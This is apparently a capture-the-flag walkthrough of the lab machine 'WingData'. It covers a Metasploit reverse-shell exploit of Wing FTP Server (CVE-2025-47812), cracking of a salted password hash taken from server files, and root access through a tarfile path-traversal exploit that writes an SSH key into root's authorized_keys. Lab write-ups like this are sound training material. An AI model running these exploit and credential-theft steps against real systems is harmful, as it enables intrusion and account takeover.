Machine Name: WingData  
Machine IP: 10.129.13.91  
We started by identifying open ports.    
```bash
rustscan -a 10.129.13.91

Open 10.129.13.91:22
Open 10.129.13.91:80
```
I opened the site on the browser and found another subdomain "ftp.wingdata.htb" by clicking Client Portal button. I saw a login page which uses "Wing FTP Server v7.4.3". When I searched about it, I saw a vulnerability on this version.     
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ msfconsole -q                           
msf > search wingftp

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/wingftp_null_byte_rce  2025-06-30       excellent  Yes    Wing FTP Server NULL-byte Authentication Bypass (CVE-2025-47812)
   1    \_ target: Unix/Linux Command Shell     .                .          .      .
   2    \_ target: Windows Command Shell        .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/wingftp_null_byte_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'

msf > use 0
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(multi/http/wingftp_null_byte_rce) > show options

Module options (exploit/multi/http/wingftp_null_byte_rce):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Password for authentication
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, socks4, http, socks5
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  anonymous        yes       Valid username for authentication
   VHOST                      no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python variant also Python ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python3.
                                              8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           192.168.0.108    yes       The listen address (an interface may be specified)
   LPORT           4444             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      mGXNEVBDL        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces


Exploit target:

   Id  Name
   --  ----
   0   Unix/Linux Command Shell



View the full module info with the info, or info -d command.

msf exploit(multi/http/wingftp_null_byte_rce) > set RHOSTS 10.129.13.91
RHOSTS => 10.129.13.91
msf exploit(multi/http/wingftp_null_byte_rce) > set RPORT 80
RPORT => 80
msf exploit(multi/http/wingftp_null_byte_rce) > set LHOST tun0
LHOST => 10.10.15.126
msf exploit(multi/http/wingftp_null_byte_rce) > set VHOST ftp.wingdata.htb
VHOST => ftp.wingdata.htb
msf exploit(multi/http/wingftp_null_byte_rce) > run
[*] Started reverse TCP handler on 10.10.15.126:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Detected version 7.4.3 ≤ 7.4.4
[+] Received UID: UID=5f558394b00dc9f411705626dd0d278af528764d624db129b32c21fbca0cb8d6; path=, injection succeeded
[*] Sending stage (3090404 bytes) to 10.129.13.91
[*] Meterpreter session 1 opened (10.10.15.126:4444 -> 10.129.13.91:37240) at 2026-04-03 15:27:00 +0400

meterpreter > shell
Process 3694 created.
Channel 1 created.
whoami
wingftp
```
Yeah, we got the shell as an ftp user. Now, I need to be "wacky" user. After a few minutes, I found the useful files in this folder:  
```bash
/opt/wftpserver/Data/1
```
When I read "/opt/wftpserver/Data/1/users/wacky.xml" file, I saw its password. I thought it is sha256 hash but being sure, I checked it.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
```
Alright, when I tried to decrypt it by using john and netcat, it didn't worked. The hash isn't stored in the rockyou.txt file so, I thought that the salt was added into this hash.    
```bash
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
And
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```
None of them worked. Lets explore more to find the salt.    
I found it in "/opt/wftpserver/Data/1/settings.xml" file. At the end of the file, you can see these lines:    
```bash
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```
"1" means salt was added and the salt is "WingFTP". Now we can decryt the password easily:    
```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1410 hash.txt --show

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```
As you can see we got the password of wacky user. 1400 = sha256 + 10 = salt. That is why I wrote -m 1410.  

----
# User Flag
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ ssh wacky@10.129.13.91 
wacky@10.129.13.91's password: 
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 3 08:12:59 2026 from 10.10.15.126
wacky@wingdata:~$ ls -la
total 24
drwxrwx--- 2 wacky wacky 4096 Jan 22 04:41 .
drwxr-xr-x 3 root  root  4096 Nov  3 12:04 ..
lrwxrwxrwx 1 root  root     9 Jan 22 04:41 .bash_history -> /dev/null
-rw-r--r-- 1 wacky wacky  220 Jun  6  2025 .bash_logout
-rw-r--r-- 1 wacky wacky 3526 Jun  6  2025 .bashrc
-rw-r--r-- 1 wacky wacky  807 Jun  6  2025 .profile
-rw-r----- 1 root  wacky   33 Apr  3 07:08 user.txt
wacky@wingdata:~$ cat user.txt
49039ec8bcf9d5ff8620d4ec2dac7513
```

----
# Root flag
I checked sudo -l and faced a py code in there:  
```bash
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
Lets check what it does:    
```bash
wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```
This Python script is designed to restore client backup files safely. Here is how the main function works, step-by-step:  
1. Input Requirements  

To run, the script needs two pieces of information:  

    Backup File (-b): The name of the archive you want to restore (e.g., backup_1001.tar).

    Restore Directory (-r): The folder name where files will be extracted (e.g., restore_john).

2. Safety Checks (Validation)  
  
Before doing anything, the script performs three "security checks":  

    Filename Check: The backup name must follow a strict pattern: backup_[number].tar.

    Folder Name Check: The restore folder must start with restore_ followed by 1 to 24 letters, numbers, or underscores.

    File Existence: It checks if the backup file actually exists in the specific system folder (/opt/backup_clients/backups).

3. The Extraction Process   

If all checks pass, the script:   

    Creates a folder: It builds a new directory in the "restored_backups" location.

    Unpacks the file: It opens the .tar archive and extracts the contents.

    Applies a safety filter: It uses a "data" filter during extraction to prevent malicious files from overwriting important system settings.

But this python code has a vulnerability:   
```bash
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```
The main issue here is the tar.extractall() function. In older versions of Python (or when an incorrect filter is applied), this function does not properly validate the file paths inside the archive.   
### What is TarSlip (Path Traversal)?   

Imagine the script is supposed to extract files into the /opt/backup_clients/restored_backups/ directory. However, I create a file inside the archive and name it: ../../../../root/.ssh/authorized_keys.  

When the script extracts this, it sees the ../ (go up one directory) commands. It "escapes" the intended folder, travels up the system hierarchy, and overwrites a critical system file.  

----
Lets check if we has write access to the archive file:  
```bash
wacky@wingdata:~$ ls -la /opt/backup_clients/backups/
total 8
drwxrwx--- 2 root wacky 4096 Jan 12 08:32 .
drwxr-x--- 4 root wacky 4096 Jan 12 08:43 ..
wacky@wingdata:~$
```
Yeahh, we can do it. Lets look at which exploit the tar.extractall() funtion has. When I searched "tar.extractall() exploit", I saw this exploit:  
<img width="1208" height="243" alt="image" src="https://github.com/user-attachments/assets/d15c3de1-7e0d-4960-8231-994eb7753f24" />    
And I found the py code of this exploit:  https://github.com/thefizzyfish/CVE-2025-4138_tarfile_filter_bypass/blob/master/CVE-2025-4138_tarfile_filter_bypass.py    
After downloading it, we can start privilege escalation steps. First of all, I have to create new ssh keys for our exploit.    
```bash
ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key
```
ed25519 is one of the safest and fast algorithims.  
```bash
python3 exploit.py -o backup_888.tar -t /root/.ssh/authorized_keys -p ~/.ssh/wingdata_key.pub -m 0600
```
It adds our public ssh key into the tar file.    
```bash
mv backup_888.tar /opt/backup_clients/backups/
```
I moved the malicious tar file into the folder where script will work.  
```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_888.tar -r restore_win123
```
This command will upload our public ssh key into the root's folder and write the results into the restore_win123 file which isn't useful for us.    
Let's became root simply:  
```bash
ssh -i ~/.ssh/wingdata_key root@127.0.0.1
```
Bingooo !!! We are root right now:  
```bash
usage: exploit.py [-h] -o OUTPUT -t TARGET -p PAYLOAD [-m MODE]
exploit.py: error: the following arguments are required: -o/--output, -t/--target
wacky@wingdata:/tmp$ python3 exploit.py -o backup_888.tar -t /root/.ssh/authorized_keys -p ~/.ssh/wingdata_key.pub -m 0600
wacky@wingdata:/tmp$ mv backup_888.tar /opt/backup_clients/backups/
wacky@wingdata:/tmp$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_888.tar -r restore_win123
[+] Backup: backup_888.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_win123
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_win123
wacky@wingdata:/tmp$ ssh -i ~/.ssh/wingdata_key root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 3 09:01:05 2026 from 127.0.0.1
root@wingdata:~# cd /root/
root@wingdata:~# ls -la
total 44
drwx------  5 root root 4096 Apr  3 07:08 .
drwxr-xr-x 18 root root 4096 Feb  9 08:19 ..
lrwxrwxrwx  1 root root    9 Jan 22 04:41 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Nov  3 10:45 .cache
-rw-------  1 root root   20 Nov  3 18:21 .lesshst
drwxr-xr-x  3 root root 4096 Nov  2 05:05 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
lrwxrwxrwx  1 root root    9 Jan 22 04:41 .python_history -> /dev/null
-rw-r-----  1 root root   33 Apr  3 07:08 root.txt
-rw-r--r--  1 root root   66 Nov  3 14:31 .selected_editor
drwx------  2 root root 4096 Apr  3 09:00 .ssh
-rw-r--r--  1 root root  165 Jan 22 04:41 .wget-hsts
root@wingdata:~# cat root.txt 
2d823c2842df78263b293e17c05ac01a
root@wingdata:~# 
```










